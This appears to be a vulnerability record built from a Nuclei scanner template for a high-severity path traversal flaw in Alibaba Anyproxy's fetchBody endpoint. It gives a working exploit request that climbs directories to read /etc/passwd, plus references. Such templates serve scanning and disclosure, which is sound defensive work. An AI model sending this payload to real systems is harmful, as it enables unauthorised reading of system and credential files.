# Nuclei Template: Alibaba Anyproxy fetchBody File - Path Traversal
**Template ID:** alibaba-anyproxy-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`alibaba-anyproxy-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Alibaba Anyproxy is vulnerable to Path Traversal.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/fetchBody?id=1/../../../../../../../../etc/passwd
```

## References
- https://github.com/alibaba/anyproxy/issues/391
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Alibaba%20AnyProxy%20fetchBody%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
